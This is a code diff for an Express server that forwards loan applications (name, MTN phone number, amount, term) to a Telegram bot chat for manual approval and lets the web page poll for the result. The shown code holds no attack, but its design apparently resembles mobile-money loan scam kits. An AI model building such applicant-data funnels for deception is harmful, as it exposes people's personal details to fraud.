@@ -14,7 +14,7 @@ const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const loans = {};
 let lastUpdateId = 0;
 
-// Prevent HTML injection if a user types <, >, or & in the form
+// Prevent HTML injection if a user enters special characters (<, >, &)
 function escapeHtml(text) {
     return String(text || '')
         .replace(/&/g, '&amp;')
@@ -22,31 +22,33 @@ function escapeHtml(text) {
         .replace(/>/g, '&gt;');
 }
 
-// Helper to format the Thor - Loan Verification message with Bold + Tap-to-Copy values
-function buildThorMessage(record, statusText, updatedTime = null) {
+// Formats the Telegram message with true bold styling on received details
+function buildThorMessage(record, statusLabel, statusUpdatedBadge = null) {
     const lines = [
-        '⚡ <b>THOR - LOAN VERIFICATION</b>',
-        '<b>LOAN APPLICATION RECEIVED</b>',
+        '# Thor - Loan Verification',
         '',
-        '<b>USER DETAILS</b>',
-        '━━━━━━━━━━━━━━━━━━━━',
-        `👤 Full Name: <b><code>${escapeHtml(record.fullName)}</code></b>`,
-        `📱 MTN Number: <b><code>${escapeHtml(record.mtnNumber)}</code></b>`,
+        'LOAN APPLICATION RECEIVED',
         '',
-        '<b>LOAN DETAILS</b>',
-        '━━━━━━━━━━━━━━━━━━━━',
-        `🆔 Reference ID: <b><code>${escapeHtml(record.id)}</code></b>`,
-        `💼 Loan Service: <b><code>${escapeHtml(record.loanService)}</code></b>`,
-        `💰 Loan Amount: <b><code>${escapeHtml(record.loanAmount)}</code></b>`,
-        `📅 Repayment Period: <b><code>${escapeHtml(record.repaymentPeriod)}</code></b>`,
+        'USER DETAILS:',
+        `• Applicant: <b>${escapeHtml(record.fullName)}</b>`,
+        `• Phone Number: <b>${escapeHtml(record.mtnNumber)}</b>`,
         '',
-        '<b>STATUS</b>',
         '━━━━━━━━━━━━━━━━━━━━',
-        `Status: <b>${escapeHtml(statusText)}</b>`
+        '',
+        'LOAN DETAILS:',
+        `• Application ID: <b>${escapeHtml(record.id)}</b>`,
+        `• Loan Type: <b>${escapeHtml(record.loanService)}</b>`,
+        `• Amount: <b>${escapeHtml(record.loanAmount)}</b>`,
+        `• Term: <b>${escapeHtml(record.repaymentPeriod)}</b>`,
+        '',
+        '━━━━━━━━━━━━━━━━━━━━',
+        '',
+        `STATUS: <b>${escapeHtml(statusLabel)}</b>`
     ];
 
-    if (updatedTime) {
-        lines.push(`Status Updated: <b><code>${escapeHtml(updatedTime)}</code></b>`);
+    if (statusUpdatedBadge) {
+        lines.push('');
+        lines.push(`Status Updated: ${statusUpdatedBadge}`);
     }
 
     return lines.join('\n');
@@ -55,7 +57,12 @@ function buildThorMessage(record, statusText, updatedTime = null) {
 // 1. Receive Application from public/index.html -> Send to Telegram
 app.post('/api/loans/apply', async (req, res) => {
     const { fullName, mtnNumber, loanService, loanAmount, repaymentPeriod } = req.body;
-    const id = 'LOAN-' + Math.floor(100000 + Math.random() * 900000);
+
+    if (!fullName || !mtnNumber || !loanService || !loanAmount || !repaymentPeriod) {
+        return res.status(400).json({ message: 'All loan application fields are required.' });
+    }
+
+    const id = 'MOMO-' + Date.now();
 
     const record = {
         id,
@@ -69,7 +76,7 @@ app.post('/api/loans/apply', async (req, res) => {
 
     loans[id] = record;
 
-    const message = buildThorMessage(record, '⏳ PENDING REVIEW');
+    const message = buildThorMessage(record, 'Pending');
 
     try {
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
@@ -78,7 +85,7 @@ app.post('/api/loans/apply', async (req, res) => {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [[
-                    { text: '✅ Approve Loan', callback_data: `APPROVE:${id}` },
+                    { text: '✅ Approve', callback_data: `APPROVE:${id}` },
                     { text: '❌ Decline', callback_data: `REJECT:${id}` }
                 ]]
             }
@@ -94,13 +101,16 @@ app.post('/api/loans/apply', async (req, res) => {
 // 2. Frontend Polls This Endpoint While Spinner Runs
 app.get('/api/loans/status/:id', (req, res) => {
     const record = loans[req.params.id];
-    if (!record) return res.status(404).json({ status: 'NOT_FOUND' });
+    if (!record) {
+        return res.status(404).json({ status: 'NOT_FOUND' });
+    }
     res.json({ status: record.status });
 });
 
 // 3. Background Listener for Admin Button Taps in Telegram
 async function pollTelegramUpdates() {
     if (!BOT_TOKEN) return;
+
     try {
         const res = await axios.get(`${TELEGRAM_API}/getUpdates`, {
             params: { offset: lastUpdateId + 1, timeout: 25 }
@@ -113,7 +123,6 @@ async function pollTelegramUpdates() {
                 const cb = update.callback_query;
                 const [decision, id] = cb.data.split(':');
                 const isApproved = decision === 'APPROVE';
-                const updatedTime = new Date().toLocaleString();
 
                 if (loans[id]) {
                     loans[id].status = isApproved ? 'APPROVED' : 'REJECTED';
@@ -127,10 +136,10 @@ async function pollTelegramUpdates() {
                 const updatedText = loans[id]
                     ? buildThorMessage(
                           loans[id],
-                          isApproved ? '✅ APPROVED' : '❌ DECLINED',
-                          updatedTime
+                          isApproved ? 'Approved' : 'Declined',
+                          isApproved ? '✅ APPROVED' : '❌ DECLINED'
                       )
-                    : `${escapeHtml(cb.message.text)}\n\nStatus: <b>${isApproved ? '✅ APPROVED' : '❌ DECLINED'}</b>\nStatus Updated: <b><code>${escapeHtml(updatedTime)}</code></b>`;
+                    : `${escapeHtml(cb.message.text)}\n\nSTATUS: <b>${isApproved ? 'Approved' : 'Declined'}</b>\n\nStatus Updated: ${isApproved ? '✅ APPROVED' : '❌ DECLINED'}`;
 
                 await axios.post(`${TELEGRAM_API}/editMessageText`, {
                     chat_id: cb.message.chat.id,
@@ -141,7 +150,7 @@ async function pollTelegramUpdates() {
             }
         }
     } catch (err) {
-        // Retry automatically on network hiccup
+        // Retry automatically on temporary network hiccup
     } finally {
         setTimeout(pollTelegramUpdates, 1000);
     }
@@ -155,3 +164,4 @@ app.listen(PORT, async () => {
         pollTelegramUpdates();
     }
 });
+
